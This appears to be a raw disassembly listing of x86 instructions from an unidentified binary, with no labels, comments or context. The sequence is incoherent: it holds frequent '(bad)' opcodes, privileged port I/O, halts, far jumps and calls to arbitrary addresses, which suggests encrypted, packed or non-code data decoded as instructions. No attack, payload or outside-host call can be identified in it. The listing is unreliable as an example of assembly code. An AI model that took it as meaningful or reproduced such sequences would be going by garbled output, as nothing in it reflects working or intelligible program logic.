  4189f2:	mov    ch,BYTE PTR [eax]
  4189f4:	xchg   edx,eax
  4189f5:	imul   ecx,DWORD PTR [edi],0xe45e0e26
  4189fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189fc:	sub    cl,BYTE PTR [ebx+0x453d07cc]
  418a02:	outs   dx,DWORD PTR ds:[esi]
  418a03:	cld    
  418a04:	sbb    esp,esp
  418a06:	sbb    al,BYTE PTR [edx+0x535f824e]
  418a0c:	cmp    DWORD PTR [esi+esi*2+0x8],ebp
  418a10:	lods   al,BYTE PTR gs:[esi]
  418a12:	scas   eax,DWORD PTR es:[edi]
  418a13:	push   ss
  418a14:	fld    QWORD PTR [ecx+0x35]
  418a17:	mov    cl,0xfb
  418a19:	mov    eax,ds:0x7f120c
  418a1e:	inc    edi
  418a1f:	hlt    
  418a20:	inc    esp
  418a21:	sbb    eax,DWORD PTR [edx+0x1cd0710e]
  418a27:	push   0xbb8f4387
  418a2c:	mov    DWORD PTR [ecx],edx
  418a2e:	jecxz  0x4189cb
  418a30:	mov    esi,0x272f2cc0
  418a35:	nop
  418a36:	and    DWORD PTR [ebx],ebx
  418a38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a39:	vaddpd xmm2,xmm5,XMMWORD PTR [edx]
  418a3d:	(bad)  
  418a3e:	inc    esi
  418a3f:	test   eax,0xfa556473
  418a44:	or     DWORD PTR [eax-0xbfdd2bd],ebx
  418a4a:	xor    bh,bh
  418a4c:	ror    DWORD PTR [ecx-0x1affea8a],cl
  418a52:	popa   
  418a53:	cmp    al,0x9
  418a55:	jns    0x418aba
  418a57:	ficomp WORD PTR [ebx-0x5d]
  418a5a:	loope  0x418aa4
  418a5c:	sti    
  418a5d:	das    
  418a5e:	add    BYTE PTR [ebp*1+0x487c5a62],dh
  418a65:	adc    DWORD PTR [eax],esp
  418a67:	fwait
  418a68:	mov    esp,0x5e0ef6df
  418a6d:	in     al,dx
  418a6e:	rcr    BYTE PTR [edi],cl
  418a70:	jb     0x418a8f
  418a72:	inc    edx
  418a73:	xor    al,0xcb
  418a75:	shl    BYTE PTR [esi+0x6e],cl
  418a78:	aas    
  418a79:	adc    eax,0x178b42df
  418a7e:	in     al,0x16
  418a80:	jae    0x418a96
  418a82:	sub    ah,dl
  418a84:	push   0xffffffde
  418a86:	out    dx,eax
  418a87:	outs   dx,DWORD PTR ds:[esi]
  418a88:	pop    ds
  418a89:	out    dx,eax
  418a8a:	arpl   WORD PTR ds:0xb9318da4,sp
  418a90:	adc    esi,DWORD PTR [esi-0x4a]
  418a93:	jnp    0x418a3f
  418a95:	mov    eax,0xdd927d39
  418a9a:	loop   0x418a41
  418a9c:	push   ebp
  418a9d:	test   DWORD PTR [esi+0x3a],0x3312fa74
  418aa4:	(bad)  
  418aa5:	pop    esp
  418aa6:	dec    edi
  418aa7:	js     0x418a8b
  418aa9:	nop
  418aaa:	shl    BYTE PTR [edi+0xa43f540],cl
  418ab0:	shr    BYTE PTR [edx+0xa887c3],cl
	...
  418b16:	jl     0x418b2b
  418b18:	test   DWORD PTR [edx],esi
  418b1a:	out    dx,eax
  418b1b:	mov    dh,0xff
  418b1d:	pop    edi
  418b1e:	mov    al,ds:0xb70941ce
  418b23:	adc    ebx,DWORD PTR [eax+0x1035234]
  418b29:	add    BYTE PTR [edi],al
  418b2b:	add    DWORD PTR [eax],eax
  418b2d:	add    BYTE PTR [edi+0x2b],dl
  418b30:	xor    ebx,DWORD PTR [esp+eiz*2]
  418b33:	cs xchg esi,eax
  418b35:	add    ebx,ecx
  418b37:	sbb    eax,0xd6f8212d
  418b3c:	fbstp  TBYTE PTR [esp+ecx*4]
  418b3f:	cmp    al,BYTE PTR [edx-0x6780e81b]
  418b45:	xchg   esi,eax
  418b46:	in     eax,0x55
  418b48:	test   esp,0x4fecf2bb
  418b4e:	(bad)  
  418b50:	push   edx
  418b51:	sub    eax,0x36542812
  418b56:	sub    BYTE PTR [ebx+0x70],0xcc
  418b5a:	inc    eax
  418b5b:	sub    DWORD PTR [eax+0x23a81e7],0xffffffe5
  418b62:	adc    cl,0x7a
  418b65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b66:	cs or  esi,edx
  418b69:	pop    esi
  418b6a:	or     ch,BYTE PTR [eax+0xc952676]
  418b70:	inc    eax
  418b71:	bound  ebx,QWORD PTR [esi+0x5c585ca1]
  418b77:	adc    eax,0xf8cb4451
  418b7c:	push   eax
  418b7d:	sbb    eax,0xe446e151
  418b82:	or     edi,esi
  418b84:	push   0xe6e0980c
  418b89:	int    0xe9
  418b8b:	mov    ds:0x72217d42,al
  418b90:	inc    ebp
  418b91:	mov    al,0x27
  418b93:	pop    ebp
  418b94:	sub    BYTE PTR [ecx+0x28],0x7
  418b98:	add    esp,0xffffffb4
  418b9b:	adc    edi,ebx
  418b9d:	push   esp
  418b9e:	lea    ebx,[ecx]
  418ba0:	pusha  
  418ba1:	stc    
  418ba2:	add    esi,0x77
  418ba5:	cdq    
  418ba6:	pusha  
  418ba7:	mov    esp,0x4695350f
  418bac:	inc    edx
  418bad:	das    
  418bae:	push   ebx
  418baf:	and    ah,al
  418bb1:	les    ecx,FWORD PTR ds:0xe7cbf28b
  418bb7:	xchg   BYTE PTR [ebp+0x6e],dl
  418bba:	mov    esi,0xa4031728
  418bbf:	call   0x74c2dcf7
  418bc4:	dec    ebx
  418bc5:	fidiv  DWORD PTR [ecx-0x32]
  418bc8:	inc    ebp
  418bc9:	popf   
  418bca:	(bad)  
  418bcb:	js     0x418c0d
  418bcd:	in     eax,0xfc
  418bcf:	and    al,BYTE PTR [ebx-0x5c]
  418bd2:	jmp    0x418b62
  418bd4:	mov    BYTE PTR [edx+0x4be5591b],bh
  418bda:	push   eax
  418bdb:	push   eax
  418bdc:	jo     0x418b72
  418bde:	fwait
  418bdf:	mov    ah,bl
  418be1:	inc    esi
  418be2:	inc    eax
  418be3:	test   eax,0x9e53fd1f
  418be8:	cwde   
  418be9:	adc    esi,edx
  418beb:	cmp    edx,DWORD PTR [edi+0x57e2f1c]
  418bf1:	mov    eax,ds:0x8e765d2
  418bf6:	xchg   DWORD PTR [ecx],edi
  418bf8:	hlt    
  418bf9:	jae    0x418b9b
  418bfb:	mov    ah,0xcd
  418bfd:	gs inc ebx
  418bff:	push   eax
  418c00:	and    eax,0xd845e59a
  418c05:	add    BYTE PTR [ecx+0x221e8b38],bh
  418c0b:	sub    bh,cl
  418c0d:	xchg   ecx,eax
  418c0e:	mov    esi,0x57754f47
  418c13:	jmp    0x418c8a
  418c15:	fwait
  418c16:	push   ebp
  418c17:	jp     0x418bf3
  418c19:	retf   
  418c1a:	(bad)  
  418c1b:	and    eax,0xb75b403d
  418c20:	jl     0x418c55
  418c22:	popf   
  418c23:	stos   DWORD PTR es:[edi],eax
  418c24:	pop    edi
  418c25:	(bad)  
  418c26:	(bad)  [eax]
  418c28:	dec    ebx
  418c29:	call   0x4ecbee73
  418c2e:	dec    esi
  418c2f:	xchg   DWORD PTR [edx-0x6a],edi
  418c32:	mov    ds:0x53a9,eax
	...
  418c93:	add    BYTE PTR [eax],al
  418c95:	add    bl,bh
  418c97:	inc    edx
  418c98:	out    dx,al
  418c99:	aas    
  418c9a:	(bad)  
  418c9b:	mov    edi,0x9c1c6fb
  418ca0:	scas   al,BYTE PTR es:[edi]
  418ca1:	adc    edi,DWORD PTR [esi+0x59a22e35]
  418ca7:	add    al,0x1
  418ca9:	add    BYTE PTR [edi],al
  418cab:	add    DWORD PTR [eax],eax
  418cad:	add    BYTE PTR [edx-0x5b],ch
  418cb0:	pop    eax
  418cb1:	call   FWORD PTR [ebp-0xf74f690]
  418cb7:	sbb    eax,0x8fd85033
  418cbc:	jo     0x418cce
  418cbe:	int3   
  418cbf:	imul   BYTE PTR [esi-0x779d5262]
  418cc5:	clc    
  418cc6:	jmp    0xb56fa8ad
  418ccb:	or     al,ah
  418ccd:	jo     0x418c68
  418ccf:	ins    BYTE PTR es:[edi],dx
  418cd0:	jbe    0x418cdc
  418cd2:	mov    esi,0xfcb01eb4
  418cd7:	push   ebx
  418cd8:	lahf   
  418cd9:	out    0xe0,eax
  418cdb:	out    0xb8,al
  418cdd:	lods   al,BYTE PTR ds:[esi]
  418cde:	cmp    dh,ch
  418ce0:	rcr    esi,0x43
  418ce3:	loope  0x418d34
  418ce5:	cmp    edi,DWORD PTR [edx-0x31]
  418ce8:	scas   al,BYTE PTR es:[edi]
  418ce9:	iret   
  418cea:	(bad)  
  418ceb:	sbb    eax,0xbca22e37
  418cf0:	shr    edi,cl
  418cf2:	cmp    ebp,DWORD PTR ds:0x4855de6e
  418cf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cf9:	or     esp,DWORD PTR cs:[edx]
  418cfc:	and    bl,dl
  418cfe:	dec    esi
  418cff:	frstor [ebp-0x1457be72]
  418d05:	leave  
  418d06:	or     esp,DWORD PTR [ebx-0x15]
  418d09:	jmp    0x418d55
  418d0b:	fstp   TBYTE PTR [ebp+eiz*4-0x32cb3f75]
  418d12:	shr    BYTE PTR [ebx],1
  418d14:	ins    DWORD PTR es:[edi],dx
  418d15:	stc    
  418d16:	pop    ds
  418d17:	test   eax,0x9da38534
  418d1c:	xchg   ebp,eax
  418d1d:	repnz mov edi,ebx
  418d20:	cmp    al,0xe7
  418d22:	and    dh,BYTE PTR [ecx-0x7d]
  418d25:	gs enter 0x1b0f,0xc
  418d2a:	sub    al,0x93
  418d2c:	xchg   DWORD PTR [ebx+0x6a84b634],esp
  418d32:	(bad)  
  418d33:	out    dx,al
  418d34:	lods   eax,DWORD PTR ds:[esi]
  418d35:	jecxz  0x418d44
  418d37:	shl    BYTE PTR [edi],cl
  418d39:	enter  0x1581,0xcb
  418d3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d3e:	dec    DWORD PTR [ecx+0x28]
  418d41:	push   esp
  418d42:	push   0x55
  418d44:	loopne 0x418d4f
  418d46:	adc    eax,0xa77f6856
  418d4b:	js     0x418d26
  418d4d:	add    ah,al
  418d4f:	mov    edx,0xc44ffea0
  418d54:	ins    DWORD PTR es:[edi],dx
  418d55:	mov    eax,ds:0xe9a67070
  418d5a:	ds sbb al,0xb0
  418d5d:	push   ebx
  418d5e:	pop    ebp
  418d5f:	out    0x3a,al
  418d61:	xor    eax,0xeb28db19
  418d66:	push   eax
  418d67:	mov    esp,0x49e1404c
  418d6c:	pop    ecx
  418d6d:	cmc    
  418d6e:	rcr    BYTE PTR [esi+eax*1-0x4170f5ec],cl
  418d75:	mov    esi,0xe49a18a2
  418d7a:	das    
  418d7b:	lods   eax,DWORD PTR ds:[esi]
  418d7c:	inc    esp
  418d7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d7e:	sbb    al,0x40
  418d80:	bound  esi,QWORD PTR [ecx-0x54]
  418d83:	mov    bh,0x99
  418d85:	pop    ecx
  418d86:	dec    esp
  418d87:	bound  eax,QWORD PTR [esi-0x3d54818a]
  418d8d:	mov    bh,0x55
  418d8f:	pop    ds
  418d90:	fwait
  418d91:	adc    BYTE PTR [ecx],0x73
  418d94:	sbb    eax,0x4c4f6c36
  418d99:	and    ecx,DWORD PTR [edi+0x4384d714]
  418d9f:	gs std 
  418da1:	pop    ebx
  418da2:	retf   
  418da3:	dec    ecx
  418da4:	loop   0x418e22
  418da6:	fs call 0xb7c294bb
  418dac:	test   ebp,edi
  418dae:	(bad)  
  418db1:	xchg   ebp,eax
  418db2:	hlt    
  418db3:	popa   
  418db4:	enter  0x0,0x0
	...
  418e14:	add    BYTE PTR [eax],al
  418e16:	push   cs
  418e17:	bnd call 0xde7c8a4d
  418e1d:	(bad)  
  418e1e:	jl     0x418e26
  418e20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e21:	mov    al,ds:0x4d769038
  418e26:	pusha  
  418e27:	add    eax,0x1070001
  418e2c:	add    BYTE PTR [eax],al
  418e2e:	pop    es
  418e2f:	ret    0xdc24
  418e32:	inc    edi
  418e33:	adc    cl,BYTE PTR [eax+0x12]
  418e36:	mov    WORD PTR [ecx+0x79a1d28a],fs
  418e3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e3d:	lock int 0xb3
  418e40:	add    bh,BYTE PTR [esi*8-0x23aeb9f7]
  418e47:	test   BYTE PTR [edx+0x49b68d1d],ch
  418e4d:	pop    es
  418e4e:	pop    ds
  418e4f:	popa   
  418e50:	cdq    
  418e51:	call   DWORD PTR [esi-0x52624418]
  418e57:	popa   
  418e58:	cdq    
  418e59:	cwde   
  418e5a:	test   DWORD PTR [ebx-0x39],0xd48034a6
  418e61:	jg     0x418dfc
  418e63:	mov    eax,ds:0xda701f9e
  418e68:	pusha  
  418e69:	mov    dl,0xc0
  418e6b:	mov    ch,0x63
  418e6d:	nop
  418e6e:	dec    esi
  418e6f:	pop    ss
  418e70:	repnz xlat BYTE PTR ds:[ebx]
  418e72:	stos   BYTE PTR es:[edi],al
  418e73:	and    al,0x90
  418e75:	xchg   ebp,eax
  418e76:	dec    ebp
  418e77:	fs dec edi
  418e79:	fxch   st(5)
  418e7b:	in     al,dx
  418e7c:	int    0x5d
  418e7e:	arpl   WORD PTR [ecx+0x7b],bx
  418e81:	addr16 mov dl,0xde
  418e84:	in     eax,0x8
  418e86:	pop    ds
  418e87:	cmp    ah,dl
  418e89:	sar    edi,cl
  418e8b:	jnp    0x418e71
  418e8d:	test   al,0xae
  418e8f:	inc    edi
  418e90:	mov    al,0xbe
  418e92:	dec    edi
  418e93:	lods   al,BYTE PTR ds:[esi]
  418e94:	mov    bl,0x1f
  418e96:	mov    eax,ds:0x5066f6d3
  418e9b:	add    ebx,eax
  418e9d:	js     0x418eaa
  418e9f:	ficom  DWORD PTR [eax]
  418ea1:	leave  
  418ea2:	in     eax,0x14
  418ea4:	rol    BYTE PTR [ecx+0x3b],0xb1
  418ea8:	aaa    
  418ea9:	pop    edx
  418eaa:	cld    
  418eab:	out    dx,al
  418eac:	int    0x94
  418eae:	add    DWORD PTR [ebx],ebp
  418eb0:	mov    cl,0x7
  418eb2:	mov    ah,0x7c
  418eb4:	xor    BYTE PTR [esi-0x6f],al
  418eb7:	fiadd  DWORD PTR [eax+ecx*8]
  418eba:	dec    edi
  418ebb:	out    0x33,al
  418ebd:	sub    bl,cl
  418ebf:	retf   
  418ec0:	fwait
  418ec1:	mov    dl,0xe8
  418ec3:	lock pop ebx
  418ec5:	call   0x9ea2c15d
  418eca:	aaa    
  418ecb:	dec    eax
  418ecc:	sub    ebp,DWORD PTR [ecx+0x39]
  418ecf:	xchg   DWORD PTR [ebp+0x51],edx
  418ed2:	outs   dx,DWORD PTR gs:[esi]
  418ed4:	push   edx
  418ed5:	jae    0x418f14
  418ed7:	ins    DWORD PTR es:[edi],dx
  418ed8:	push   0x91972f23
  418edd:	xchg   BYTE PTR [esi+eiz*2+0x14],bh
  418ee1:	mov    WORD PTR [esi+0x41b05b6b],fs
  418ee7:	cmp    ch,al
  418ee9:	sub    al,0xde
  418eeb:	arpl   WORD PTR [ebx+eax*4],ax
  418eee:	mov    ch,0xb2
  418ef0:	sar    BYTE PTR [esi],cl
  418ef2:	aad    0xef
  418ef4:	adc    DWORD PTR [ebx+ebx*1],0xf9e0e3c4
  418efb:	dec    esp
  418efc:	dec    ebp
  418efd:	mov    eax,ds:0xc194fab9
  418f02:	add    dh,BYTE PTR [ecx+0x8]
  418f05:	adc    eax,ecx
  418f07:	(bad)  
  418f08:	pop    edi
  418f09:	xchg   ebx,eax
  418f0a:	jae    0x418ecc
  418f0c:	pop    edx
  418f0d:	push   cs
  418f0e:	inc    ecx
  418f0f:	lds    ebp,FWORD PTR [ebx]
  418f11:	jl     0x418eff
  418f13:	push   esi
  418f14:	jmp    0x418eda
  418f16:	xlat   BYTE PTR ds:[ebx]
  418f17:	adc    al,0x9
  418f19:	sbb    al,0x42
  418f1b:	ret    
  418f1c:	dec    DWORD PTR [edx+0x34]
  418f1f:	pop    es
  418f20:	mov    ch,0xc7
  418f22:	cmp    dh,BYTE PTR [ebp-0x620cb722]
  418f28:	into   
  418f29:	out    dx,al
  418f2a:	fist   DWORD PTR [edi+0x77d56c4b]
  418f30:	mov    esi,0x6daaaa54
	...
  418f95:	add    BYTE PTR [edi+edx*4],bl
  418f98:	in     al,0x47
  418f9a:	out    dx,eax
  418f9b:	ja     0x418f5c
  418f9d:	fist   WORD PTR [ebp+0x87adcb2]
  418fa3:	fadd   st(3),st
  418fa5:	add    eax,0x10667
  418faa:	pop    es
  418fab:	add    DWORD PTR [eax],eax
  418fad:	add    BYTE PTR [ebx+0xf5af215],cl
  418fb3:	push   0xbb015d11
  418fb8:	aam    0xc1
  418fba:	push   esi
  418fbb:	sbb    esp,DWORD PTR [ebp-0x5ff1ef81]
  418fc1:	xchg   DWORD PTR [esi-0x7c],ebp
  418fc4:	jne    0x418f5c
  418fc6:	outs   dx,BYTE PTR ds:[esi]
  418fc7:	mov    esi,0x8cae555a
  418fcc:	push   esi
  418fcd:	outs   dx,BYTE PTR ds:[esi]
  418fce:	push   ebx
  418fcf:	push   0x53
  418fd1:	cmp    dh,BYTE PTR [ecx]
  418fd3:	inc    eax
  418fd4:	sub    al,0xb8
  418fd6:	mov    eax,ds:0xa329a45e
  418fdb:	out    dx,eax
  418fdc:	push   ebp
  418fdd:	aas    
  418fde:	dec    ecx
  418fdf:	jg     0x418fd7
  418fe1:	push   ebx
  418fe2:	cmp    eax,0x55a2b35e
  418fe7:	pusha  
  418fe8:	mov    ah,0xf0
  418fea:	popf   
  418feb:	mov    ebx,0xed0c9e1d
  418ff0:	jb     0x418fb0
  418ff2:	mov    ch,0x10
  418ff4:	jmp    0x7f25:0x85b426a3
  418ffb:	or     ebx,DWORD PTR es:[ecx]
  418ffe:	mov    ds:0x8674f58f,al
  419003:	push   edi
  419004:	popa   
  419005:	dec    edi
  419006:	repz sti 
  419008:	push   0xffffffd6
  41900a:	call   0xe05e8395
  41900f:	call   0xf605ee9c
  419014:	leave  
  419015:	inc    edi
  419016:	add    cl,BYTE PTR [eax]
  419018:	inc    eax
  419019:	pop    es
  41901a:	jge    0x41903e
  41901c:	cmp    al,0x6
  41901e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41901f:	xor    al,0x91
  419021:	ret    
  419022:	dec    edi
  419023:	out    dx,al
  419024:	ret    
  419025:	add    eax,0xb06f25c2
  41902a:	xchg   DWORD PTR [esi-0x71],esi
  41902d:	inc    edx
  41902e:	mov    ds:0x9559f62a,eax
  419033:	rcr    DWORD PTR [esi+0x2c],cl
  419036:	sub    BYTE PTR ds:0x537ca7da,ch
  41903c:	in     al,dx
  41903d:	pop    ebx
  41903e:	mov    ah,0x61
  419040:	mov    WORD PTR [esi+0xf],es
  419043:	lods   al,BYTE PTR ds:[esi]
  419044:	sbb    BYTE PTR [ebp+ebx*1-0x6b38d7e4],dh
  41904b:	xchg   edx,eax
  41904c:	or     al,0x85
  41904e:	(bad)  
  41904f:	mov    edx,0x2a670dd4
  419054:	xchg   ebx,eax
  419055:	in     al,dx
  419056:	test   BYTE PTR [ebp+0x76],0xa8
  41905a:	xor    ah,BYTE PTR [eax+0x48e32c6d]
  419060:	imul   esp,DWORD PTR [ecx-0x4ebaa316],0xffffff9a
  419067:	into   
  419068:	sbb    edi,DWORD PTR [esi]
  41906a:	call   0x1515ffe7
  41906f:	repnz pop ebp
  419071:	adc    eax,0x52a61fe9
  419076:	pop    esp
  419077:	push   ebp
  419078:	xchg   esp,eax
  419079:	jle    0x41900a
  41907b:	add    al,0xb8
  41907d:	adc    al,0xe4
  41907f:	xchg   ebp,eax
  419080:	sar    BYTE PTR [esi-0x6e30afef],1
  419086:	mov    esi,0x5e357de
  41908b:	mov    ebp,DWORD PTR [eax]
  41908d:	and    eax,0x7ce751b3
  419092:	sub    edx,DWORD PTR [edi]
  419094:	cmc    
  419095:	jo     0x4190bc
  419097:	xchg   esi,eax
  419098:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419099:	outs   dx,BYTE PTR ds:[esi]
  41909a:	mov    esi,0xb92ad4e
  41909f:	jge    0x419066
  4190a1:	out    dx,al
  4190a2:	ins    BYTE PTR es:[edi],dx
  4190a3:	xchg   DWORD PTR [ebp-0x64e92d8e],ebx
  4190a9:	call   0x9429530c
  4190ae:	jge    0x419108
  4190b0:	repnz shl dh,cl
  4190b3:	fimul  DWORD PTR [edx]
	...
  419115:	add    BYTE PTR [edi-0x41bd617b],ch
  41911b:	pop    ebx
  41911c:	(bad)  
  41911d:	in     eax,dx
  41911e:	daa    
  41911f:	jle    0x4190b5
  419121:	add    esi,DWORD PTR [esi]
  419123:	pushf  
  419124:	aam    0x39
  419126:	outs   dx,BYTE PTR ds:[esi]
  419127:	pop    es
  419128:	add    DWORD PTR [eax],eax
  41912a:	pop    es
  41912b:	add    DWORD PTR [eax],eax
  41912d:	add    BYTE PTR [eax+0x1a919763],dl
  419133:	inc    eax
  419134:	shl    DWORD PTR [eax-0x52],1
  419137:	mov    al,0xc8
  419139:	stos   DWORD PTR es:[edi],eax
  41913a:	pushf  
  41913b:	sub    edi,esi
  41913d:	lock aam 0x69
  419140:	mov    esi,0xaff117bc
  419145:	cmp    al,BYTE PTR [eax]
  419147:	imul   ebx,DWORD PTR [ebp+0x52],0xae96fec3
  41914e:	inc    edi
  41914f:	and    DWORD PTR [esi],ebp
  419151:	xchg   edx,eax
  419152:	inc    edx
  419153:	es call 0xd46a:0x5b97029c
  41915b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41915c:	call   FWORD PTR [ebx-0x5d]
  41915f:	jp     0x4191b2
  419161:	bound  ebp,QWORD PTR [esi]
  419163:	inc    edx
  419164:	adc    ah,BYTE PTR [eax]
  419166:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419167:	xchg   edi,eax
  419168:	dec    ecx
  419169:	aad    0x3
  41916b:	push   es
  41916c:	and    al,0xe3
  41916e:	or     eax,0xe2180cf6
  419173:	fwait
  419174:	cmc    
  419175:	loop   0x4191c2
  419177:	xor    DWORD PTR [edi],eax
  419179:	xchg   edx,eax
  41917a:	inc    ebp
  41917b:	xor    bl,BYTE PTR [ebp+0x1d]
  41917e:	clc    
  41917f:	mov    eax,ds:0x2a5ebbc3
  419184:	push   es
  419185:	inc    edi
  419186:	jp     0x419132
  419188:	push   ebx
  419189:	adc    DWORD PTR [edi+0x73],ebx
  41918c:	inc    esp
  41918d:	jmp    0xfc9d:0xc1475ec7
  419194:	retf   
  419195:	(bad)  
  419196:	and    al,0x4f
  419198:	je     0x41917c
  41919a:	sbb    al,0xd8
  41919c:	inc    ecx
  41919d:	xchg   ebp,eax
  41919e:	call   0x682c:0xceb30585
  4191a5:	std    
  4191a6:	lods   al,BYTE PTR ds:[esi]
  4191a7:	lds    ebp,FWORD PTR [edi+edi*1-0x9]
  4191ab:	enter  0x10a9,0x46
  4191af:	add    ch,BYTE PTR [esi+0x4d119a1]
  4191b5:	jmp    0x6cae:0x435c52a3
  4191bc:	mov    fs,esi
  4191be:	shl    BYTE PTR [ebp+0x66],1
  4191c1:	push   esi
  4191c2:	adc    cl,bl
  4191c4:	mov    ?,WORD PTR [edx]
  4191c6:	jge    0x4191c9
  4191c8:	mov    ah,0x79
  4191ca:	xor    dl,BYTE PTR [eax-0x2a]
  4191cd:	in     eax,dx
  4191ce:	mov    ds:0x77de91a8,al
  4191d3:	dec    ebx
  4191d4:	or     DWORD PTR [ebp+0x1000a23f],esi
  4191da:	jmp    0x4c2af264
  4191df:	inc    ebp
  4191e0:	mov    ah,0xd8
  4191e2:	fstp   QWORD PTR [ebx]
  4191e4:	xchg   ebx,eax
  4191e5:	mov    esi,0xb7aa954
  4191ea:	adc    esp,DWORD PTR [eax+0x6d]
  4191ed:	lea    edx,fs:[edx-0x79]
  4191f1:	dec    edi
  4191f2:	mov    eax,DWORD PTR [ebx-0x1a4de5cc]
  4191f8:	pop    edx
  4191f9:	addr16 adc esi,edx
  4191fc:	shl    BYTE PTR [esi+0x7ea6de91],0xd3
  419203:	les    edi,FWORD PTR [edx-0x2e]
  419206:	in     eax,0x78
  419208:	push   ebx
  419209:	cld    
  41920a:	push   ss
  41920b:	mov    edx,DWORD PTR [esi+0x557126ed]
  419211:	clc    
  419212:	in     eax,dx
  419213:	jp     0x41928c
  419215:	sahf   
  419216:	mov    eax,ds:0x2d2b9ff
  41921b:	and    esi,DWORD PTR [edx]
  41921d:	sub    DWORD PTR [eax],0x68ec018
  419223:	popa   
  419224:	iret   
  419225:	add    eax,0x53c54a20
  41922a:	outs   dx,DWORD PTR ds:[esi]
  41922b:	outs   dx,DWORD PTR ds:[esi]
  41922c:	cmp    eax,0x908507ee
  419231:	sub    bl,cl
  419233:	xor    BYTE PTR [edx+0x0],ah
	...
  419295:	add    BYTE PTR [eax-0xcc4519],ah
  41929b:	jg     0x419246
  41929d:	idiv   DWORD PTR [edi+ebx*2]
  4192a0:	mov    esp,0x98599f4f
  4192a5:	pushf  
  4192a6:	jne    0x4192b0
  4192a8:	add    DWORD PTR [eax],eax
  4192aa:	pop    es
  4192ab:	add    DWORD PTR [eax],eax
  4192ad:	add    BYTE PTR [edx-0x3f],al
  4192b0:	jno    0x419253
  4192b2:	imul   edx,DWORD PTR [edi+eax*1],0xffffffa6
  4192b6:	jge    0x419329
  4192b8:	mov    dh,BYTE PTR [ebx]
  4192ba:	push   0x62
  4192bc:	xchg   edx,eax
  4192bd:	adc    DWORD PTR [edx],0x9fd4bcfb
  4192c3:	or     DWORD PTR [edi],ecx
  4192c5:	dec    edi
  4192c6:	arpl   WORD PTR [edi+edx*8+0x3b],si
  4192ca:	and    DWORD PTR cs:[edx-0x73c1ad24],edi
  4192d1:	fnstsw WORD PTR [edi+eiz*4]
  4192d4:	push   0x48
  4192d6:	xchg   ebp,eax
  4192d7:	xchg   BYTE PTR [edi+0x6f],bl
  4192da:	add    bh,BYTE PTR [ecx]
  4192dc:	repz test DWORD PTR [esp+esi*2-0x25],ecx
  4192e1:	inc    edi
  4192e2:	jp     0x419341
  4192e4:	and    al,0x1b
  4192e6:	cli    
  4192e7:	xlat   BYTE PTR ds:[ebx]
  4192e8:	cmp    eax,0x169ee505
  4192ed:	out    dx,eax
  4192ee:	mov    dl,0x86
  4192f0:	outs   dx,BYTE PTR ds:[esi]
  4192f1:	and    al,0x74
  4192f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192f4:	clc    
  4192f5:	inc    esi
  4192f6:	mov    ds:0xd6616534,al
  4192fb:	lods   al,BYTE PTR ds:[esi]
  4192fc:	shl    DWORD PTR [edi],1
  4192fe:	sub    ebp,DWORD PTR [edx-0x5b]
  419301:	mov    WORD PTR [edx+0x5c],gs
  419304:	ret    0x7e48
  419307:	adc    BYTE PTR [edx-0x38],ah
  41930a:	push   es
  41930b:	jmp    0x4192b6
  41930d:	in     eax,0x37
  41930f:	stos   DWORD PTR es:[edi],eax
  419310:	xor    bl,BYTE PTR [edi-0x4d]
  419313:	xchg   ebp,eax
  419314:	or     eax,0xeaceadfe
  419319:	sbb    DWORD PTR [ebx+edx*2-0x57723075],0xffffffd0
  419321:	or     dh,BYTE PTR [ecx-0x23f68e0f]
  419327:	fucom  st(7)
  419329:	cld    
  41932a:	mov    ebp,DWORD PTR [eax+0xd]
  41932d:	out    0xbd,eax
  41932f:	pop    esi
  419330:	cmc    
  419331:	js     0x4192c1
  419333:	mov    al,0x19
  419335:	dec    eax
  419336:	out    dx,eax
  419337:	pop    edx
  419338:	fs push cs
  41933a:	cmc    
  41933b:	pop    es
  41933c:	repnz sbb eax,0xcc3dbf6
  419342:	ins    DWORD PTR es:[di],dx
  419344:	into   
  419345:	pop    ebp
  419346:	cmc    
  419347:	ds test eax,0xcccd1c07
  41934d:	data16 and al,BYTE PTR [ebx-0xd]
  419351:	rcl    DWORD PTR [esi+0x6a],cl
  419354:	mov    dl,0x7
  419356:	popf   
  419357:	adc    BYTE PTR [eax+0x70],ch
  41935a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41935b:	mov    ds:0x27c2d148,al
  419360:	or     al,0x6c
  419362:	lods   al,BYTE PTR ds:[esi]
  419363:	aaa    
  419364:	js     0x419399
  419366:	adc    ebx,edi
  419368:	mov    bl,0x45
  41936a:	mov    ch,0xda
  41936c:	pop    eax
  41936d:	ins    DWORD PTR es:[edi],dx
  41936e:	jmp    0xa2cae0f0
  419373:	leave  
  419374:	in     al,dx
  419375:	xor    dh,BYTE PTR [edi+0x39]
  419378:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419379:	cmp    DWORD PTR [eax-0x18],0xde968514
  419380:	test   DWORD PTR ds:0xf7dd7eab,0x359b2d5e
  41938a:	mov    al,0x43
  41938c:	sbb    BYTE PTR [edi],dl
  41938e:	xor    bl,ch
  419390:	mov    eax,esi
  419392:	add    dh,BYTE PTR ds:0x44b34f3a
  419398:	lods   al,BYTE PTR ds:[esi]
  419399:	adc    al,0xca
  41939b:	retf   0x61e7
  41939e:	mov    ebp,0x3d7718dd
  4193a3:	xor    ecx,esi
  4193a5:	sar    dh,0xa5
  4193a8:	rcl    DWORD PTR [edi],1
  4193aa:	mov    eax,ds:0x677221dc
  4193af:	sub    ebp,DWORD PTR [ebx-0x75]
  4193b2:	hlt    
  4193b3:	leave  
  4193b4:	add    BYTE PTR cs:[eax],al
	...
  419413:	add    BYTE PTR [eax],al
  419415:	add    BYTE PTR ds:0xed3a6998,bh
  41941b:	sti    
  41941c:	jg     0x4193bd
